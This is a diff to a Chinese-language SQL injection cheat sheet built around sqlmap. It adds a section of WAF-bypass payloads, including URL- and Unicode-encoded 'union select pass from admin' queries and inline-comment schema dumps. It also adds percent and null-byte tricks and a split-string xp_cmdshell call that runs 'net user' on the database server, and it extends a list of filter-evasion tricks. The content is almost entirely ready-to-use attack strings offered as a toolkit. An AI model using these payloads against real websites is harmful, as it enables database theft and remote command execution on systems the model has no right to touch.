@@ -94,7 +94,38 @@ sqlmap -u http://xxx.asp --cookie "id=114" --level 2
 - `-T 表名 -C 字段名 -C" "` --dump
 - `--file-read 文件` 读取文件
 - `--file-write 本地文件 --file-dest 目标目录`写入文件
+## 绕waf
+1. url编码
 
+?id=1 union select pass from admin limit 1
+?id=1%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%70%61%73%73%20%66%72%6f%6d%20%61%64%6d%69%6e%20%6c%69%6d%69%74%20%31
+
+
+2. Unicode编码
+
+```
+'e' => '%u0065', //这是他的Unicode 编码
+?id=1 union select pass from admin limit 1
+?id=1 un%u0069on sel%u0065ct pass f%u0072om admin li%u006dit 1
+```
+3. 反注释
+```
+/*!30000union all select (select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit 10,1),null,null,null,null*/--
+```
+4. 加%
+```
+newsid=60+a%nd%201=(se%lect%20@@VERSION)--
+newsid=60+a%nd%201=(se%lect%20@@servername)--
+```
+
+5. NULL字节
+```
+xx.asp?0day5.com=%00.&xw_id=69%20 and 1=1和xx.asp?0day5.com=%00.&xw_id=69%20 and 1=2
+```
+6. 关键字拆分
+```
+cnseay.com/1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')
+```
 ### sqlmap 自带的绕过脚本 --tamper详解  
 
     (1) apostrophemask.py UTF-8编码 
@@ -313,8 +344,8 @@ sqlmap -u http://xxx.asp --cookie "id=114" --level 2
 
 ## 绕过
 
-sql注入绕行waf:；POST ，cookie中转,大小写混合，替换关键字，使用编码(16进制，hex编码)，使用注释，等价函数和命令，使用特殊符号，http参数控制，pwn ,select \`version()\`  
-sel%00ect,%20=>空格,/!**/ => 空格  
+sql注入绕行waf:；POST ，cookie中转,大小写混合，替换关键字，使用编码(16进制，hex编码)，使用注释，等价函数和命令，使用特殊符号，http参数控制，pwn ,select \`version()\` %0A,%20
+sel%00ect,%20=>空格,/!**/ => 空格 异常method，`~ ！+ -`连接符
 ### 双等号绕过
 username=p'='&password=p'='  
 
